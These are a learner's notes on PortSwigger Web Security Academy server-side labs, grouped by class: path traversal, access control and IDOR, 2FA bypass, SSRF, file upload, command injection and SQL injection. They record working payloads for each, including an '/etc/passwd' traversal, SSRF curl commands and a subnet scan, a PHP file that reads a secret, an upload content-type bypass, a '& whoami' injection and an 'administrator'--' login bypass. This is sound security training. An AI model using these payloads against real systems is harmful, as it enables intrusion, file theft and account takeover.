# PortSwigger Web Security Academy: Server-side Topics

**Status:** Complete (Labs 1–15)

Grouped by vulnerability class. See [raw_notes.txt](raw_notes.txt) for the per-lab log kept during the exercise.

---

## Path traversal

Accessing files/images via a `?filename` parameter can be abused by sending `../../../` sequences to reach files outside the intended directory.

**Lab1:** `?filename=../../../../etc/passwd` on an image endpoint. The browser didn't display it properly, so I curl'd the URL directly to see the raw response.

## Access control

Access control = gaining access to data or functionality a user shouldn't have.

**Vertical privilege escalation** — a regular user gains admin-level access.
- **Lab2:** checked `/robots.txt`, found a disallowed admin path, visited it directly.
- **Lab3:** searched page scripts (F12, ctrl+F for `isAdmin`) to find a hidden admin link, then visited it.
- **Lab4:** login flow set an `isAdmin:true/false` cookie visible in the network tab. Edited the cookie value via devtools storage to `true`, then visited `/admin`.

**Horizontal privilege escalation (IDOR)** — a user gains access to another user's data, usually by editing an ID parameter. Also called IDOR (insecure direct object reference).
- **Lab5:** found a post by carlos, visited his profile, noted `?userId=` in the URL, then used `my-account?id=[carlos id]` to find an exposed API.
- **Lab6:** visited `my-account?id=administrator`, used the inspector to grab a hidden field value, logged in with it, and deleted a user from the admin panel.

## Authentication

**Authentication** = checking the user is who they claim to be. **Authorization** = checking they're allowed to do something.

**Brute forcing:** automating login attempts. Usernames are often public or predictable (e.g. first.lastname@company). Passwords tend to be less random due to human habits — e.g. `Mypasswd1!` with only 1-2 characters changed on each forced update.

**Username enumeration:** register pages can reveal already-taken usernames; login pages can reveal "correct username, wrong password" vs. "no such user."

**Lab7:** skipped for now.

**Skipping 2FA:** sometimes after entering credentials the user is already in a logged-in-ish state, and the post-login URL can be edited directly to reach content before completing 2FA.

**Lab8:** logged into my own account, entered 2FA, noted the URL pattern (`my-account?id=wiener`). Then logged in with the target's credentials, and when prompted for 2FA, changed the URL to the `id=` pattern instead and got in.

## SSRF (Server-Side Request Forgery)

Causing the server-side application to make requests to internal services — e.g. hitting an internal REST API the client can't reach directly.

**Lab9:**
```
curl --request POST --data-urlencode 'stockApi=http://localhost/admin' "<url>/product/stock"
curl --request POST --data-urlencode 'stockApi=http://localhost/admin/delete?username=carlos' "<url>/product/stock"
```
Pointed the `stockApi` param at an internal admin path, then at a delete action on that same internal path.

**Lab10:** no internal IP known ahead of time, so scripted a scan across a subnet using the same injection point:
```bash
for i in {1..255}; do
    echo "=== 192.168.0.$i ==="
    curl -s --request POST --data-urlencode "stockApi=http://192.168.0.$i:8080/admin" "<url>/product/stock"
    echo
done
```
Ran it, grepped the output for `admin` to find the live host, then hit that host's delete endpoint directly the same way as Lab9.

## File upload

The ability to upload files without guardrails on type/content.

**Lab11:** uploaded a one-line PHP file as an avatar:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
Network tab showed a GET to `/files/avatars/`, so visited `/files/avatars/exploit.php` directly and it ran.

**Lab12:** same exploit.php, but this time content-type was checked:
```
curl -X POST "<url>/my-account/avatar" -H "Cookie: session=..." -F "avatar=@exploit.php;type=image/jpeg" -F "user=wiener" -F "csrf=..."
```
Intercepted the request in the network tab and changed the content-type of exploit.php to `image/jpeg` to get past the check, while keeping the `.php` extension. Uploaded successfully and ran it the same way as Lab11.

**Lab13:** checked the stock-check POST request and noticed the fields looked shell-adjacent, so tried:
```
curl --request POST --data-urlencode 'productId=& echo hello' --data-urlencode 'storeId=& whoami' "<url>/product/stock"
```
Got `hello` and `peter-WP0JXh` back — command injection, params were being passed straight into a shell command.

## SQL injection

**Lab14:** visited a category page, appended `'--` to the end of the input.

**Lab15:** in the login form, used `username=administrator'--` to log in without a valid password.
